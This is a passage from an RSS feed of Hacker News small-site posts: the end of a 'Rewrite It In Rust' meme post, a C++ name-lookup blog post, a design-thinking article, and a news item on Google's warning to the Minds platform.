<p>Finally, I stumbled across <a href="http://robert.ocallahan.org/2016/02/rewrite-everything-in-rust.html" title="rewrite everytihng in rust">this blog</a>.</p>
<p>Despite being quite new, and certainly newer than the meme itself, this post seems to exemplify many of the talking points extolled by proponents of <strong>RIIR</strong>.</p>
<p>Its title even comes in the form of a call to action:</p>
<blockquote>
<p>Rewrite Everything In Rust</p>
</blockquote>
<h2 id="so">So...?</h2>
<p>I don't really have more to say on the matter.
I just wrote this much to document a phenomenon I've noticed.</p>
<p>I don't have a comments section, because it ends up being really time consuming to say annoying, opinionated things if you have to answer for the fallout in your comments section.
Instead, I made <a href="https://github.com/ansuz/RIIR" title="Rewrite It In Rust">a github repo</a> where you can <a href="https://github.com/ansuz/RIIR/issues">file an issue</a> which:</p>
<ol>
<li>voices your own obnoxious opinion</li>
<li>supports my thesis<ul>
<li>super bonus points if you find more github issues asking for Rust rewrites</li>
</ul>
</li>
<li>refutes my thesis<ul>
<li>super science points if you find that this behaviour is not exhibited disproportionately by Rust users</li>
</ul>
</li>
<li>links to some project where somebody actually did <em>Rewrite It In Rust</em></li>
</ol>
<h2 id="did-this-post-offend-you">Did this post offend you?</h2>
<p>Cool.</p>
<p>Talk about it.</p>
<p>Tell your friends.</p>
<p>Good memes die hard.</p>
<p>--ansuz</p>
<p><strong>2016-03-22</strong></p>
 </div>
    </div>
</div></div>]]>
            </description>
            <link>http://transitiontech.ca/random/RIIR</link>
            <guid isPermaLink="false">hacker-news-small-sites-25807127</guid>
            <pubDate>Sun, 17 Jan 2021 01:10:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fun with conversion-operator name lookup]]>
            </title>
            <description>
<![CDATA[
Score 38 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25806846">thread link</a>) | @mmastrac
<br/>
January 16, 2021 | https://quuxplusone.github.io/blog/2021/01/13/conversion-operator-lookup/ | <a href="https://web.archive.org/web/*/https://quuxplusone.github.io/blog/2021/01/13/conversion-operator-lookup/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>As of this writing (but perhaps not for very much longer!) the four mainstream compilers
on Godbolt Compiler Explorer give four different answers for
<a href="https://godbolt.org/z/jo3dc4">this simple C++ program</a>:</p>

<div><div><pre><code>struct A {
    using T = T1;
    using U = U1;
    operator U1 T1::*();
    operator U1 T2::*();
    operator U2 T1::*();
    operator U2 T2::*();
};

inline auto which(U1 T1::*) { return "gcc"; }
inline auto which(U1 T2::*) { return "icc"; }
inline auto which(U2 T1::*) { return "msvc"; }
inline auto which(U2 T2::*) { return "clang"; }

int main() {
    A a;
    using T = T2;
    using U = U2;
    puts(which(a.operator U T::*()));
}
</code></pre></div></div>

<p>The question is whether <code>U</code> should be looked up in the scope of <code>test</code> or in the scope of <code>A</code>;
and the same question for <code>T</code>.</p>

<p>According to the current draft standard, it sounds like the conforming answer is
“they should <em>both</em> be looked up in the scope of <code>A</code>”; i.e., GCC’s answer is correct
and the others are wrong in three different ways. <a href="http://eel.is/c++draft/basic.lookup.unqual#5">[basic.lookup.unqual]/5</a>:</p>

<blockquote>
  <p>An unqualified name that is a component name of a <em>type-specifier</em> or <em>ptr-operator</em>
of a <em>conversion-type-id</em> is looked up in the same fashion as the <em>conversion-function-id</em>
in which it appears. If that lookup finds nothing, it undergoes unqualified name lookup;
in each case, only names that denote types or templates whose specializations are types are considered.</p>
</blockquote>

<p>I’m never a fan of lookups that don’t consider certain <em>kinds</em> of names; I’m sure there’s more divergence
to be discovered in this area. Anyway, in the type name <code>U T::*</code>, <code>U</code> is the <em>type-specifier</em>
and <code>T::*</code> is the <em>ptr-operator</em>, and the whole type is pronounced “pointer to a data member of <code>T</code>,
where that data member itself is of type <code>U</code>.”
(More concisely: “pointer to data member (of type <code>U</code>) of <code>T</code>,” or “pointer to a <code>U</code> member of <code>T</code>.”)</p>

<p>See also:</p>

<ul>
  <li><a href="https://quuxplusone.github.io/blog/2019/09/10/friend-access-inconsistencies/">“Implementation divergence with <code>friend</code>”</a> (2019-09-10)</li>
</ul>

  </div></div>]]>
            </description>
            <link>https://quuxplusone.github.io/blog/2021/01/13/conversion-operator-lookup/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25806846</guid>
            <pubDate>Sun, 17 Jan 2021 00:21:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Cargo Cult of Design Thinking. – Tangible UX]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25806761">thread link</a>) | @absolute100
<br/>
January 16, 2021 | https://tangible-ux.com/ideas/the-cargo-cult-of-design-thinking/ | <a href="https://web.archive.org/web/*/https://tangible-ux.com/ideas/the-cargo-cult-of-design-thinking/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="content" role="main">

 <div>
<div>
<div>
<div>
<div>
<div>

<div>

<div>
<p><span>I often speak with leaders of organizations, and they tell me they want their people to be more innovative. â€œOur SVP is wanting our whole group to do that Design Thinking thing,â€� or â€œOur companyâ€™s growth strategy is dependent on innovation.â€�</span></p>
<p><span>According to the </span><a href="https://www.accenture.com/t20180705T112257Z__w__/us-en/_acnmedia/PDF-10/Accenture-Innovation-Research-ExecSummary.pdf"><span>2015 US Innovation Survey</span></a><span> by </span><a href="https://www.accenture.com/us-en"><span>Accenture</span></a><span>, 84% of executives believe innovation is critical to success. Accenture asserts that they just donâ€™t know how to do it. Executives are on the right path, but arenâ€™t effectively instilling innovation in their businesses. </span></p>
<h3><b>Real problems, real solutions</b></h3>
<p><span>If organizations really want to drive innovation and create concrete innovative solutions and products, Design Thinking is an excellent place to start. Design Thinking refers to a set of creative problem-solving techniques that are used to discover human-centric, customer-focused solutions to real world problems. </span></p>
<p><span>Design Thinking is a highly effective tool for driving innovation in any company. Unfortunately, I hear people complain that Design Thinking does not work â€“ â€œWe tried that, and it didnâ€™t work for our companyâ€� or â€œDesign Thinking is not the way to go.â€�</span></p>
<h3><b>Agree to disagree</b></h3>
<p><span>But when I dig into why Design Thinking is not working for them, I get answers like </span><a href="https://twitter.com/malbonster?lang=en"><span>Tim Malbon</span></a><span>â€™s in his article titled </span><a href="https://medium.com/the-many/the-problem-with-design-thinking-988b88f1d696"><span>The Problem with Design Thinking</span></a><span>. â€œDesign Thinking delivers a wonderful day or two off from the realities of boring old business-as-usual. Youâ€™ll always remember the day you were let out of your work cubicle (aka veal-fattening pen) to â€˜playâ€™ with Sharpies and Post-Its along with colleagues on Brainstorm Island. [â€¦] However, in terms of lasting, impactful, commercial innovation, the Design Thinking scorecard doesnâ€™t look so healthy.â€�</span></p>
<p><span>Tim is a founding partner of </span><a href="https://www.madebymany.com/"><span>Made by Many</span></a><span>, a digital product innovation and strategy company. Heâ€™s a smart guy, but I feel he falls victim to the same type of thinking that many other executives do which I call the â€œcargo cult of Design Thinking.â€�</span></p>
<h3><b>Cult following</b></h3>
<p><span>A â€œ</span><a href="https://www.anthroencyclopedia.com/entry/cargo-cults#h2ref-0"><span>cargo cultâ€�</span></a><span> is a term to describe belief systems that developed among less technologically advanced societies when new and foreign technology was introduced. For example, during World War II, an enormous amount of supplies and equipment were airlifted to the islands of Melanesia, from which the indigenous people benefited greatly. After the war, the shipments stopped and they didnâ€™t know why. To lure back planes loaded with desirable goods, the Melanesians cut airstrips out of the jungle </span><span>and made replicas of the planes and equipment that had brought the goods that they desired</span><span> with the hope that the supplies would return.</span></p>
<figure id="attachment_873" aria-describedby="caption-attachment-873"><img loading="lazy" src="https://47sdqu2v9nr35d2yd3zi00dh-wpengine.netdna-ssl.com/wp-content/uploads/CargoCultDesignThinkingBlogImage-768x123-1.jpg?_t=1588181035" alt="" width="768" height="123" srcset="https://47sdqu2v9nr35d2yd3zi00dh-wpengine.netdna-ssl.com/wp-content/uploads/CargoCultDesignThinkingBlogImage-768x123-1.jpg 768w, https://47sdqu2v9nr35d2yd3zi00dh-wpengine.netdna-ssl.com/wp-content/uploads/CargoCultDesignThinkingBlogImage-768x123-1-300x48.jpg 300w, https://47sdqu2v9nr35d2yd3zi00dh-wpengine.netdna-ssl.com/wp-content/uploads/CargoCultDesignThinkingBlogImage-768x123-1-320x51.jpg 320w, https://47sdqu2v9nr35d2yd3zi00dh-wpengine.netdna-ssl.com/wp-content/uploads/CargoCultDesignThinkingBlogImage-768x123-1-150x24.jpg 150w" sizes="(max-width: 768px) 100vw, 768px"><figcaption id="caption-attachment-873">Hand-made replicas of the planes and equipment that brought cargo.</figcaption></figure>
<h3>“Sometimes management works the same way with regard to innovation â€“ they act out rituals and create models of the things they think will bring them the ever-elusive creativity they seek.”</h3>
<p><span>Sometimes management works the same way with regard to innovation â€“ they act out rituals and create models of the things they think will bring them the ever-elusive creativity they seek. They want their workforce to be innovative, but they donâ€™t know how to get it to be. So theyâ€™ll do any number of things, such as:</span></p>
<ul>
<li><span>Designate a â€œcreative room,â€� stock it with bean bags, toys, and sticky notes, fill it with team members â€¦ and then tell them, â€œOK, go innovate!â€�</span></li>
<li><span>Send some poor soul to a two-day class, and hope they come back and â€œinfectâ€� the entire organization with creativity.</span></li>
<li><span>Give some other person a title like â€œCreative Lead,â€� and charge them with making the organization more innovative.</span></li>
</ul>
<p><span>And so on. To be expected, this cargo cult-style method of introducing innovation doesnâ€™t work. </span></p>
<p><span>So what does it take to make design and innovation work for an organization? First, an acknowledgement that design- and innovative thinking are not easy. The Design Thinking process may look simple and fun from the outside, but true creativity doesnâ€™t just happen â€“ it takes knowledge and deep understanding of proven theories and mechanics, training, and above all, practice.</span></p>
<h3><b>No train, no gain</b></h3>
<p><span>When you identify an organization that has successfully made Design Thinking part of their culture, youâ€™ll also see that the organization has made a commitment to training.</span></p>
<p><span>According to </span><a href="https://www.intuitlabs.com/"><span>Intuit Labs</span></a><span>, â€œeach and every employee is expected to think like an entrepreneur, and itâ€™s everyoneâ€™s job to create, to invent, and to look for new and better ways to improve our customersâ€™ lives. […] We all learn the techniques, and practice the behaviors to be innovators and help our customers around the world be prosperous.â€� </span></p>
<p><span>As </span><a href="https://twitter.com/intuitbrad?lang=en"><span>Brad Smith</span></a><span>, former CEO of Intuit explained, â€œAt Intuit, innovation is everyoneâ€™s job.â€� This is the way it should be. Innovation is not just one- or two-day training sessions for a few people; it is a way of working for the entire company. Organizations like Intuit look at training as an investment in their entire workforce.</span></p>
<p><span>Investing in training is key to making your organization more innovative and creative. Instead of converting an empty office into a â€œcreative caveâ€� and filling it with toys, find out more about the training course Iâ€™ve built for organizations like yours; it specifically makes Design Thinking approachable and doable for non-designers.</span></p>
<p><span>If youâ€™d like to explore how this program can transform your workforce, </span><a href="https://tangible-thinking.com/contact/"><span>letâ€™s get to know each other.</span></a></p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</section></div>]]>
            </description>
            <link>https://tangible-ux.com/ideas/the-cargo-cult-of-design-thinking/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25806761</guid>
            <pubDate>Sun, 17 Jan 2021 00:05:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google sends ‘24 hour warning’ to free-speech ‘anti-Facebook’ platform, Minds]]>
            </title>
            <description>
<![CDATA[
Score 37 | Comments 35 (<a href="https://news.ycombinator.com/item?id=25806746">thread link</a>) | @drummer
<br/>
January 16, 2021 | https://speakingaboutnews.com/google-sends-24-hour-warning-to-free-speech-anti-facebook-platform-minds/ | <a href="https://web.archive.org/web/*/https://speakingaboutnews.com/google-sends-24-hour-warning-to-free-speech-anti-facebook-platform-minds/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			<p><strong>The social media platform Minds had to remove ‘major functionality’ from its Android app after getting a chilling warning from Google. Its co-founder said plans for a censorship-resistant infrastructure are in the works.</strong></p>
<p>In a&nbsp;<a href="https://www.minds.com/newsfeed/1196949029506060288" rel="noreferrer noopener" target="_blank">post</a>&nbsp;on Friday evening, Bill Ottman said that Minds had received a&nbsp;<em>“24 hour warning”</em>&nbsp;from the Google Play store. This forced them to submit an updated version of the app, based on&nbsp;<em>“interim solution and ninja developers,”</em> which removed the search, discovery and comments functionality.</p>
<p><em>“I know. We aren’t happy and will be working towards something better,”</em>&nbsp;Ottman said.&nbsp;<em>“What is happening on the internet with major providers is fueling the cultural divide as much as anything,”</em>&nbsp;he added.</p>
<p>Operating since 2015, Minds was conceived as a blockchain-based community-owned social media platform that would not monetize user data but enable free speech instead.&nbsp;<a href="https://www.wired.com/story/minds-anti-facebook/" rel="noreferrer noopener" target="_blank">Wired</a>&nbsp;magazine once described it as the&nbsp;<em>“anti-Facebook.”</em></p>
<p><em>Owen is joined by James O’Keefe of Project Veritas, after the explosive video released of Twitter CEO Jack Dorsey who revealed his true intentions on social media.</em></p>
<p>Ottman advised users to download the app from Minds directly if possible.&nbsp;<em>“If you are on Apple, leave if you’re smart,”</em>&nbsp;he said.</p>


<p>As for going forward, he said a plan for&nbsp;<em>“fully censorship-resistant infrastructure”</em>&nbsp;is coming soon, and that Minds has&nbsp;<em>“multiple escape pods ready to go”</em>&nbsp;if Amazon moves against them.</p>
<p>Ottman’s comments were a clear reference to what happened to Parler. The free-speech social media platform attracted tens of thousands of users purged from Twitter in the wake of the January 6 unrest at the US Capitol – only to be banned from Google and Apple stores, and then taken down from the internet entirely after Amazon Web Services (AWS) denied them access to the cloud. Parler’s executives later revealed that other vendors rushed to jump ship as well, leaving them unable to operate entirely.</p>
<p>Those who complained about the rising tide of censorship have typically been told that the First Amendment to the US Constitution did not apply to private companies and that people should&nbsp;<em>“build their own”</em>&nbsp;platforms if they disagreed. Parler’s shutdown has shown that this is near-impossible when the major players control the internet infrastructure itself, however.</p>
<p>Mainstream media and tech platforms have gone after Parler, Gab, Minds, and Telegram for allegedly having&nbsp;<em>“far-right”</em>users and allowing&nbsp;<em>“hate speech”</em>&nbsp;as content. In Parler’s case, Amazon’s ultimatum demanded moderation policies they would approve of in order to avoid removal from AWS.</p>
<p>In a lawsuit accusing Amazon of breach of contract, antitrust violations and defamation, Parler argued that this was pretextual and revealed that Amazon staff sought to find out if US President Donald Trump – freshly banned from Twitter and locked out of Facebook – had set up an account on the platform.</p>
    
    		</div></div>]]>
            </description>
            <link>https://speakingaboutnews.com/google-sends-24-hour-warning-to-free-speech-anti-facebook-platform-minds/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25806746</guid>
            <pubDate>Sun, 17 Jan 2021 00:03:08 GMT</pubDate>
        </item>
    </channel>
</rss>
